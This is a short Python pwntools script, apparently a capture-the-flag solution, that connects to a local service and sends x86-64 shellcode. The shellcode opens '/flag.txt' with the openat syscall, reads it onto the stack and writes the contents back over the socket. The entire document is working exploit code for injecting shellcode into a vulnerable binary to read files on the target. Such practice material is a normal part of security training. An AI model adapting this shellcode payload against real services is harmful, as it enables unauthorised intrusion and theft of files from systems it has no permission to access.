#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./task", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="b vuln")
p = remote("127.0.0.1", 9001)

payload = b""
payload += asm(shellcraft.pushstr("/flag.txt"))
payload += asm("""
    mov edi, -1
    mov rsi, rsp
    xor edx, edx
    mov eax, SYS_openat
    syscall
""")
payload += asm(shellcraft.read('rax', 'rsp', 64))
payload += asm(shellcraft.write(1, 'rsp', 'rax'))
p.sendline(payload)

print(p.readuntil(b"}").decode())
